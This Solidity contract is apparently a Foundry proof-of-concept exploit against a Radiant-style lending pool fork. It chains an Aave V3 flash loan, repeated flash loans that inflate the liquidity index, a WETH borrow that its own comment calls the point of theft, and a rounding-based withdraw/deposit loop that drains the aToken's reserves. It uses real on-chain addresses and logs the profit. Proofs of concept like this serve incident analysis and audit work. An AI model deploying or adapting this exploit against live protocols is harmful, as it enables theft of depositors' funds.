// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

import {IAToken, IERC20} from "contracts/interfaces/IAToken.sol";
import {ILendingPool} from "contracts/interfaces/ILendingPool.sol";
import {IPriceOracle} from "contracts/interfaces/IPriceOracle.sol";
import "forge-std/Test.sol";

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external returns (uint256 amountOut);
}

contract Exploit {
    ILendingPool aaveLendingPool =
        ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    uint256 state;

    IERC20 constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

    ILendingPool lendingPool;
    IAToken atoken;
    IERC20 underlyingAsset;

    IPriceOracle priceOracle =
        IPriceOracle(0xC0cE5De939aaD880b0bdDcf9aB5750a53EDa454b);

    IUniswapV3Router router =
        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function exploit(
        address lendingPool_,
        address atoken_,
        uint256 amount
    ) public {
        lendingPool = ILendingPool(lendingPool_);
        atoken = IAToken(atoken_);
        underlyingAsset = IERC20(atoken.UNDERLYING_ASSET_ADDRESS());

        // flashloan into AAVEv3
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory interestRateModes = new uint256[](1);

        assets[0] = address(underlyingAsset);
        amounts[0] = amount;
        interestRateModes[0] = 0;

        aaveLendingPool.flashLoan(
            address(this),
            assets,
            amounts,
            interestRateModes,
            address(this),
            "",
            0
        );

        console.log(
            "* Profit : %d USDC",
            underlyingAsset.balanceOf(address(this)) / 1e6
        );

        state = 0;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        (params);
        // state 0: flashloan from AAVEv3
        if (state == 0) {
            require(msg.sender == address(aaveLendingPool), "unauthorized");
            require(
                initiator == address(this),
                "flashloan not initiated by self"
            );
            require(
                assets[0] == address(underlyingAsset),
                "unexpected asset (1)"
            );
            exploit1(amounts[0], premiums[0]);
            // state 1: flashloan from radiant
        } else if (state == 1) {
            require(msg.sender == address(lendingPool), "unauthorized");
            exploit2(amounts[0], premiums[0]);
        } else {
            revert("unexpected state");
        }
        return true;
    }

    function exploit1(uint256 amount, uint256 premium) internal {
        // shove underlying asset to pool
        uint256 amountForInflation = (amount * 7) / 10;
        {
            underlyingAsset.transfer(address(atoken), amountForInflation);
        }

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory interestRateModes = new uint256[](1);

        assets[0] = address(underlyingAsset);
        amounts[0] = amountForInflation;
        interestRateModes[0] = 0;

        state = 1;
        underlyingAsset.approve(address(lendingPool), 1);
        lendingPool.deposit(address(underlyingAsset), 1, address(this), 0);
        lendingPool.flashLoan(
            address(this),
            assets,
            amounts,
            interestRateModes,
            address(this),
            "",
            0
        );

        for (uint i = 0; i < 100; i++) {
            lendingPool.flashLoan(
                address(this),
                assets,
                amounts,
                interestRateModes,
                address(this),
                "",
                0
            );
        }

        uint256 liquidityIndex = lendingPool.getReserveNormalizedIncome(
            address(underlyingAsset)
        ) / 1e27;
        console.log("* Inflated liquidityIndex: %d", liquidityIndex);

        // Take out a WETH loan using USDC as collateral. This step is where theft effectively occurs
        // assume LTV is approx. 30%
        lendingPool.borrow(
            address(WETH),
            (liquidityIndex *
                priceOracle.getAssetPrice(address(underlyingAsset)) *
                3) / 10,
            2,
            0,
            address(this)
        );

        // mint 2 more atokens
        underlyingAsset.approve(address(lendingPool), liquidityIndex * 2);
        lendingPool.deposit(
            address(underlyingAsset),
            liquidityIndex * 2,
            address(this),
            0
        );

        uint256 stepSize = underlyingAsset.balanceOf(address(this));
        uint256 withdrawSize = stepSize;

        {
            lendingPool.withdraw(
                address(underlyingAsset),
                (liquidityIndex * 3) / 2 - 1,
                address(this)
            );
            withdrawSize =
                underlyingAsset.balanceOf(address(this)) -
                withdrawSize;
            // deposit underlying assets to get 1 unit of atoken
            underlyingAsset.approve(address(lendingPool), liquidityIndex);
            lendingPool.deposit(
                address(underlyingAsset),
                liquidityIndex,
                address(this),
                0
            );
            stepSize = underlyingAsset.balanceOf(address(this)) - stepSize;
        }

        {
            uint256 amountToDrain = underlyingAsset.balanceOf(address(atoken));
            uint256 numSteps = amountToDrain / stepSize;
            for (uint i = 0; i < numSteps; i++) {
                uint256 remBalance = underlyingAsset.balanceOf(address(atoken));
                if (remBalance < withdrawSize) {
                    lendingPool.withdraw(
                        address(underlyingAsset),
                        remBalance,
                        address(this)
                    );
                    break;
                }
                lendingPool.withdraw(
                    address(underlyingAsset),
                    (liquidityIndex * 3) / 2 - 1,
                    address(this)
                );
                underlyingAsset.approve(address(lendingPool), liquidityIndex);
                lendingPool.deposit(
                    address(underlyingAsset),
                    liquidityIndex,
                    address(this),
                    0
                );
            }
        }

        // swap WETH to USDC
        WETH.approve(address(router), type(uint256).max);
        router.exactInputSingle(
            IUniswapV3Router.ExactInputSingleParams({
                tokenIn: address(WETH),
                tokenOut: address(underlyingAsset),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: WETH.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // asset success and repay premium
        underlyingAsset.approve(address(aaveLendingPool), amount + premium);
    }


    function exploit2(uint256 amount, uint256 premium) internal {
        underlyingAsset.approve(address(lendingPool), amount + premium);
    }
}
